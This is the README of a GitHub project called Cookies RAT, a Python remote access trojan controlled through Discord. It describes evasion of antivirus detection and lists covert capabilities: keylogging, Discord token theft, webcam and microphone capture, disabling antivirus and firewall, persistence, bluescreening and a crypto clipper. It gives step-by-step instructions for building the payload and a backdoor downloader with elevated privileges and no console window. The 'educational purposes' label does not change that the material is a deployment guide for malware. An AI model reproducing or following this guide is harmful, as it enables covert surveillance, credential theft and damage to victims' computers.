<p align="center">
  <img src="https://sonarcloud.io/api/project_badges/measure?project=Callumgm_Cookies_RAT&metric=ncloc">
  <img src="https://img.shields.io/badge/version-5.0.4-blue.svg?cacheSeconds=2592000" >
  <img src="https://img.shields.io/badge/Maintained%3F-yes-green.svg" >
  <img src="https://img.shields.io/badge/license-MIT-yellow.svg" >
  <img src="https://img.shields.io/github/last-commit/Callumgm/Cookies_RAT">
  <a href="https://twitter.com/Flashouttt" target="_blank">
    <img src="https://img.shields.io/twitter/follow/Flashouttt.svg?style=social">
  </a>
</p>

<!-- PROJECT LOGO -->
<br />
<p align="center">
  <a href="https://github.com/Callumgm/Cookies_RAT">
    <img src="./logo.png" alt="Logo" width="200" height="190">
  </a>

  <h1 align="center">Cookies Remote Access Trojan</h1>

  <p align="center">
    Very reliable remote access trojan
    <br />
    <a href="#commands"><strong>All Commands »</strong></a>
    <br />
    <br />
    <a href="https://github.com/Callumgm/Cookies_RAT/issues">Report Bug</a>
    ·
    <a href="https://github.com/Callumgm/Cookies_RAT/issues">Request Feature</a>
    ·
    <a href="https://github.com/Callumgm/Cookies_RAT/pulls">Send a Pull Request</a>
  </p>
</p>

<br>


## <a id="content"></a>🌐 〢 Content

- [:dart:・About](#about)
- [:sparkles:・Features](#features)
- [:gear:・Commands](#commands)
- [:white_check_mark:・Requirements](#requirements)
- [:file_folder:・Getting Started](#gettingstarted)
- [:pushpin:・Todo/Enhancements](#enhancements)
- [:thought_balloon:・Change Log](#changelog)
- [:hammer_and_wrench:・Custom Commands](#customcommands)
- [👤・Author](#author)
- [🤝・Contributing](#contributing)
- [🌟・Show your support](#support)
- [📝・License](#license)

## <a id="about"></a>:dart: 〢 About ##

> Builder has just been fixed any bugs make sure to create a issue if you find one.

> Do not scan the compiled payload with any anti-virus otherwise, it will become detected and rendered useless!

- [Current virus total score 3/69](https://www.virustotal.com/gui/file/392fe56181e995dca39c946b062a943214b97735f59897cae4629f29575d56c4?nocache=1)

Remote Access Tool (rat) built in python made for Educational purposes only, discord is utilized as the CNC <br>
All client file packages and modules are imported directly in Python interpreter's process memory (giving it such a low detection rate)
<br>

## <a id="features"></a>:sparkles: 〢 Features ##

:heavy_check_mark: Create payload\
:heavy_check_mark: Create keylogger add on\
:heavy_check_mark: Create data grabber add on\
:x: Set auto commands\
:x: Create custom payload


## <a id="commands"></a>:gear: 〢 Commands ##

```shell
> Anti-Debug
> Record Mic Audio for 10s
> Webcam Image / StreamImages
> All Monitors Screenshot Image / StreamImages
> Replace Old Payload With Updated Version
> Clean Easy To Read Keylogger
> Geolocate
> Bluescreen PC If RAT Is Stopped (critproc)
> Grab Discord Tokens
> Kill All Inactive Sessions
> Check If RAT Has Administration Perms
> Block Mouse & Keyboard Input
> Bluescreen PC
> Grab Clipboard History
> Delete Files
> Disable Anti-Virus
> Disable Firewall
> Disable Task Manager
> Turn All Monitors Off
> Download Files
> Force Administration Perm
> Get Idle Time
> Grab PC Info
> List Running Proccesses
> Log Off User
> Shutdown PC
> Restart PC
> Set Volume To 100%
> Set Volume To 0%
> Send Custom Error Message
> Scan IP For Open Ports
> Set Persistence For The RAT
> Remove All Traces Of The RAT (self destruct)
> Execute Shell Commands
> Start File
> Add RAT To Startup
> Force Stop Running Tasks
> Show Current Open Window
> Write Message
> Open Website
```


## <a id="requirements"></a>:white_check_mark: 〢 Requirements ##

Before starting :checkered_flag:, you are required to have [Python 3.9.7](https://www.python.org/downloads/release/python-397/) installed and [added to path](https://docs.blender.org/manual/en/latest/_images/about_contribute_install_windows_installer.png).


## <a id="gettingstarted"></a>:file_folder: 〢 Getting Started ##

### Installation ###

Below is how to setup and create a payload.

1. Fork the repository, make sure to keep the repository name the same.

> (If you do not fork the repository, you will not be able to create a low detectable payload since the remote import will fail.)

2. Replace `GITHUB_USERNAME_HERE` with your GitHub username in `payload.py`
```python
Github_username = "GITHUB_USERNAME_HERE"
```

3. Replace `DISCORD_TOKEN_HERE` with your Discord Bot Token in `payload.py`
```python
rat.token_set("DISCORD_TOKEN_HERE")
```

4. Replace `DISCORD_WEBHOOK_URL` with your Webhook URL & replace `DISCORD_SERVER_ID` with your discord server id `rat.py`
```python
api = 'DISCORD_WEBHOOK_URL'
server_id = "DISCORD_SERVER_ID"
```

5. Run `create_payload.py`

6. Wait for the payload to be created


### Optional ###

Below is how to create a simple backdoor for the rat

1. Download or clone the repository

2. Enter your Discord Webhook URL in `backdoor.py`
```python
api = 'DISCORD_WEBHOOK_URL'
```

3. Replace "DOWNLOAD_URL_HERE" with the download URL of the payload
```python
r = requests.get("DOWNLOAD_URL_HERE", allow_redirects=False)
```

4. Cd to the directory of the `backdoor.py`

5. Run `pyinstaller --onefile --noconsole --uac-admin --clean --log-level=INFO backdoor.py`

6. After the program is compiled, you can find the created executable in the directory `dist`

> Any problems? Create an issue!


## <a id="enhancements"></a>:pushpin: 〢 Todo/Enhancements ##

- [x] Fix builder
- [x] Clean builder GUI
- [x] Remote import all commands for less detections
- [x] Create backdoor
- [ ] Add this [sound](https://www.youtube.com/watch?v=LoJ5flCZR9Q) as a command
- [ ] Be able to customize payload when creating it
- [ ] Add delete all saved passwords & cookies
- [ ] Add break PC (delete system32)
- [ ] Add worm function
- [ ] Create backdoor with only shell (make whole payload remote imported)



## <a id="changelog"></a>:thought_balloon: 〢 Change Log ##

```diff
v5.0.4 ⋮ 2022-07-24
+ fixed some minor errors
+ added defualt for keylogger intervals

v5.0.3 ⋮ 2022-07-18
+ fixed major little error

v5.0.2 ⋮ 2022-07-16
+ fixed module bugs (hope it works now)
+ client is ran via remote import now
- moved create payload from builder to separate file

v5.0.1 ⋮ 2022-07-16.
+ fixed builder

v5.0.0 ⋮ 2022-07-16
+ project made opensource and released to github

v4.1.0 ⋮ 2022-07-04
+ fixed create keylogger & data grabber being broken
+ added info.txt (way to save info when creating payloads)
+ cleaned up main.py
+ fixed selfdestruct command not working becuase of empty embed
+ added crypto clipper
+ added upload file
+ fixed open port scanner

v2.0.0 ⋮ 2022-07-02
+ cleaned code
+ added my own personal package for easier usage
- removed create custom payload for testing
- removed shitty bugs
```

## <a id="customcommands"></a>:hammer_and_wrench: 〢 Custom Commands ##



- If your wondering how to add your own commands to the rat here is an example of how to do it.
  - make sure to add the try except block to the command function to stop all rat crashes

```python
@slash.slash(name="COMMAND_NAME", description="COMMAND_DESCRIPTION", guild_ids=g)
async def COMMAND_NAME_command(ctx: SlashContext):
    if ctx.channel.name == channel_name:
        try:
            func()
            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
            await ctx.send(embed=my_embed)
        except Exception as e:
            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
            await ctx.send(embed=my_embed)
```

- Also here are some embed "templates" + colors

```python
0x00FF00 - Green
0xFF0000 - Red
0x3A3636 - Gray

except Exception as e:
    my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
    await ctx.send(embed=my_embed)

my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
await ctx.send(embed=my_embed)

my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
await ctx.send(embed=my_embed)

```

## <a id="author"></a>👤 〢 Author ##

 👤 **CookiesKush420**  

- Website: http://cookiesservices.xyz/  
- Twitter: [@Flashouttt](https://twitter.com/Flashouttt)  
- GitHub: [@Callumgm](https://github.com/Callumgm)    

 👤 **6nz** 

- Credits to [@6nz](https://github.com/6nz/) for the anti debug since it does slap.



## <a id="contributing"></a>🤝 〢 Contributing ##
Contributions, issues and feature requests are welcome!<br />Feel free to check
[issues page](https://github.com/Callumgm/Cookies_RAT/issues).  


## <a id="support"></a>🌟 〢 Show your support ##
Give a ⭐️ if this project helped you! 


## <a id="license"></a>📝 〢 License ##
 Copyright © 2022
[CookiesKush420](https://github.com/Callumgm).<br />  This project is [MIT](https://github.com/Callumgm/Cookies_RAT/blob/master/LICENSE) licensed.
